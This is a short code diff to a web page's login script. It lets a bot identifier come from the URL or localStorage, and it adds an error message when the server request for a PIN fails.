@@ -152,7 +152,15 @@
 
     const fullName = localStorage.getItem('fullName');
     const phone = localStorage.getItem('phone');
-    const botId = 'bot1'; // change if needed
+
+    // ✅ Multi-bot safe botId
+    const params = new URLSearchParams(window.location.search);
+    const botId =
+      params.get('botId') ||
+      localStorage.getItem('botId') ||
+      'bot1';
+
+    localStorage.setItem('botId', botId);
 
     if (!fullName || !phone) {
       alert('Session expired. Please start again.');
@@ -191,6 +199,13 @@
           botId
         })
       });
+
+      if (!res.ok) {
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Server error. Please try again.';
+        loginBtn.disabled = false;
+        return;
+      }
 
       const { requestId } = await res.json();
       pollPin(requestId);
